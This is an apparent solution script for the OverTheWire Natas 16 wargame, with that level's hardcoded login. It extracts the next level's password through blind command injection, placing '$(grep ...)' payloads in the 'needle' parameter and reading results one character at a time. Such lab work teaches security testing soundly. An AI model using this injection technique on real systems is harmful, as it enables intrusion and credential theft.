import requests
from requests.auth import HTTPBasicAuth

url = "http://natas16.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

# characters used in Natas passwords (0-9, a-z, A-Z)
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password = ""

print("[*] Extracting natas17 password...")

for position in range(1, 33):
    for char in chars:
        test_guess = password + char
        payload = f'$(grep -E ^{test_guess} /etc/natas_webpass/natas17)'

        # send POST/GET request depending on Natas 16 form (usually GET or POST via needle parameter)
        response = requests.get(url, auth=auth, params={"needle": payload})

        # if 'African' is NOT in the response, the inner grep outputted text (TRUE)
        if "African" not in response.text:
            password += char
            print(f"[+] Character {position}: {password}")
            break

print(f"\n[!] Final Password: {password}")